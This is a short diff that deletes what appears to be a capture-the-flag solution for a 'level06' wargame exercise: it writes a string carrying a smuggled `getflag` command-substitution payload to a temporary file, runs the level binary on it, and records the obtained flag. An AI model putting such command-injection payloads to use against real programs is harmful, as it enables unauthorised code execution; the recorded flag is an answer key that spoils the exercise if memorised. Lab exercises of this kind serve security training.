@@ -1,5 +1,0 @@
-echo '[x ${`getflag`}]' > /tmp/tmp
-
-./level06 /tmp/tmp
-
-flag = wiok45aaoguiboiki2tuin6ub
